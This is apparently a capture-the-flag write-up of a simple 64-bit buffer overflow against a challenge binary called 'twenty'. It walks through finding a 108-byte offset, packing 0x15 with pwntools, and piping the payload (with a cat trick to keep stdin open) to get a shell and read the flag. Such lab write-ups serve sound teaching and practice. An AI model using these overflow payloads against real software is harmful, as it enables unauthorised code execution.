> Simple buffer offerflow involving overwriting `0x0` in memory to `0x15`.

Through trail and error in sending a bunch of `A`s (constantly looking at `dmesg | tail`) we find the offset or padding to be`108`characters. At this offset, we can control the value of`0x0` in memory.

```
python -c "print('A'*108)" | ./twenty
```

Using pwntools, we can find the Little Endian equivalent of `0x15` using the `p64()` function, since the binary is a `64-bit ELF Executable`.

`pwn.p64(0x15)` gives us `'\x15\x00\x00\x00\x00\x00\x00\x00'` in Little Endian.

```
python -c "print('A'*108 + '\x15\x00\x00\x00\x00\x00\x00\x00')" | ./twenty
```

Finally, we see our payload working but the shell getting closed as soon as it opens. This can be fixed by a simple `cat` trick to hold STDIN open so we can interact with the shell.

```
( python -c "print('A'*108 + '\x15\x00\x00\x00\x00\x00\x00\x00')"; cat ) | ./twenty
```

We have our shell. `cat flag.txt` gets us the flag.
